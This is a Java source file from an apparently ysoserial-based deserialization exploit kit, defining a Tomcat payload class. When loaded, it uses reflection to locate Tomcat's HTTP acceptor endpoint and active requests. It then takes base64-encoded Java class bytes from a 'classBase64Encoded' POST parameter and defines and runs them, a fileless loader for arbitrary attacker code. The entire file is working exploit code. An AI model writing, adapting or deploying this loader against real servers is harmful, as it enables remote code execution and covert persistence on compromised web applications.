package ysoserial.bullet.template.tomcat;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.util.Iterator;

public class TomcatPOSTLoader {
    static {
        Object jioEndPoint = GetAcceptorThread();
        if (jioEndPoint != null) {
            java.util.ArrayList processors = (java.util.ArrayList) getField(getField(getField(jioEndPoint, "handler"), "global"), "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();
                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) ((org.apache.coyote.Request) req).getNote(1);
                org.apache.catalina.connector.Response response = request.getResponse();
                String code = request.getParameter("classBase64Encoded");
                try {
                    PrintWriter writer = response.getWriter();
                    writer.println("gh4tgh4t");
                    writer.flush();
                    if (code != null) {
                        byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(code);
                        java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{byte[].class, int.class, int.class});
                        defineClassMethod.setAccessible(true);
                        Class cc = (Class) defineClassMethod.invoke(TomcatPOSTLoader.class.getClassLoader(), classBytes, 0, classBytes.length);
                        cc.newInstance().equals(new Object[]{request, response});
                    }
                } catch (Exception e) {
                }
            }
        }
    }

    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (Exception e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public static Object GetAcceptorThread() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null || thread.getName().contains("exec")) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = getField(thread, "target");
                if (!(target instanceof Runnable)) {
                    try {
                        getField(thread, "this$0");
                        target = thread;
                    } catch (Exception e) {
                        continue;
                    }
                }
                Object jioEndPoint = getField(target, "this$0");
                if (jioEndPoint == null) {
                    try {
                        jioEndPoint = getField(target, "endpoint");
                    } catch (Exception e) {
                        continue;
                    }
                }
                return jioEndPoint;
            }
        }
        return null;
    }
}
